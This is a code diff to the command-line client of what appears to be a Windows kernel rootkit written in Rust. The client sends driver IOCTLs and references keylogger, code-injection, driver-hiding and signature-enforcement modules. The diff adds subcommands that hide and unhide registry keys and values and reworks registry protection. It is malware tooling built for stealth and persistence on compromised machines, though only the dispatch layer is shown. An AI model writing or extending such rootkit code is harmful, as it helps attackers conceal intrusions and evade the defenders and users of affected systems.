@@ -2,7 +2,10 @@ use {
     clap::Parser, 
     shared::ioctls::*,
     module::enumerate_module,
-    cli::{Cli, Commands, ProcessCommands, ThreadCommands, InjectionCommands, Injection}, 
+    cli::{
+        Cli, Commands, ProcessCommands, ThreadCommands, 
+        InjectionCommands, Injection, RegistryCommands
+    }, 
     driver::{dse, enumerate_driver, unhide_hide_driver}, 
     keylogger::keylogger, 
     process::{
@@ -25,10 +28,11 @@ mod keylogger;
 mod thread;
 mod injection;
 mod module;
+mod utils;
 
 #[cfg(not(feature = "mapper"))]
 use {
-    registry::{registry_protection_value, registry_protection_key},
+    registry::{registry_protection, registry_hide},
     process::protection_process,
     thread::protection_thread,
 };
@@ -145,30 +149,52 @@ fn main() {
             }
         },
         #[cfg(not(feature = "mapper"))]
-        Commands::Registry { name, add, remove, key } => {
-            if *add && *remove {
-                eprintln!("[-] Error: Both add and remove options cannot be specified at the same time");
-            } else if *add {
-                match name {
-                    Some(ref name_value) => {
-                        registry_protection_value(IOCTL_REGISTRY_PROTECTION_VALUE, name_value, &key, true);
+        Commands::Registry { sub_command } => match sub_command {
+            RegistryCommands::Protect { key, name, add, remove } => {
+                if *add && *remove {
+                    eprintln!("[-] Error: Both add and remove options cannot be specified at the same time");
+                } else if *add {
+                    match name {
+                        Some(ref name) => {
+                            registry_protection(IOCTL_REGISTRY_PROTECTION_VALUE, name, &key, true);
+                        },
+                        None => {
+                            registry_protection(IOCTL_REGISTRY_PROTECTION_KEY, &"".to_string(), &key, true);
+                        }
+                    }
+                } else if *remove {
+                    match name {
+                        Some(ref name) => {
+                            registry_protection(IOCTL_REGISTRY_PROTECTION_VALUE, name, &key, false);
+                        },
+                        None => {
+                            registry_protection(IOCTL_REGISTRY_PROTECTION_KEY,&"".to_string(), &key, false);
+                        }
+                    }
+                } else {
+                    eprintln!("[-] Error: Either add or remove must be specified");
+                }
+            },
+            RegistryCommands::Hide { key, value } => {
+                match value {
+                    Some(ref value) => {
+                        registry_hide(IOCTL_HIDE_UNHIDE_VALUE, value, &key, true);
                     },
                     None => {
-                        registry_protection_key(IOCTL_REGISTRY_PROTECTION_KEY, &key, true);
+                        registry_hide(IOCTL_HIDE_UNHIDE_KEY, &"".to_string(), &key, true);
                     }
                 }
-            } else if *remove {
-                match name {
-                    Some(ref name_value) => {
-                        registry_protection_value(IOCTL_REGISTRY_PROTECTION_VALUE, name_value, &key, false);
-                    },
-                    None => {
-                        registry_protection_key(IOCTL_REGISTRY_PROTECTION_KEY, &key, false);
-                    }
-                }
-            } else {
-                eprintln!("[-] Error: Either add or remove must be specified");
             }
+            RegistryCommands::Unhide { key, value } => {
+                match value {
+                    Some(ref value) => {
+                        registry_hide(IOCTL_HIDE_UNHIDE_VALUE, value, &key, false);
+                    },
+                    None => {
+                        registry_hide(IOCTL_HIDE_UNHIDE_KEY, &"".to_string(), &key, false);
+                    }
+                }
+            },
         },
         Commands::Module { pid } => {
             enumerate_module(IOCTL_ENUMERATE_MODULE, pid);
